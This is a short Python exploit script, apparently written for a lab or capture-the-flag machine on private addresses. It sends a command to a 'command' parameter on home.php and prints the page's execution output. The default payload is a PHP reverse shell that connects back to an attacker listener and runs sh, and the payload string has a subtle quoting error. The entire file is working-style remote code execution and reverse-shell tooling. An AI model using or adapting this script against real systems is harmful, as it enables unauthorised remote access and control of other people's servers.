import requests as r
import sys
from bs4 import BeautifulSoup 

LHOST="10.10.10.10"
LPORT=9000
RHOST="10.10.110.110"

# :linux payload
payload = f"""php -r '$sock=fsockopen("{LHOST},{LPORT});exec("sh <&3 >&3 2>&3");'"""
if len(sys.argv) == 2:
	payload = sys.argv[1]	

# exploit
url = f"http://{RHOST}/home.php"
data = {'command': payload}
print(data)

resp = r.post(url, data=data) 

# parse exec result
soup = BeautifulSoup(resp.text, 'html.parser')
content = soup.body.get_text().replace('Execute','').strip()
print(content)
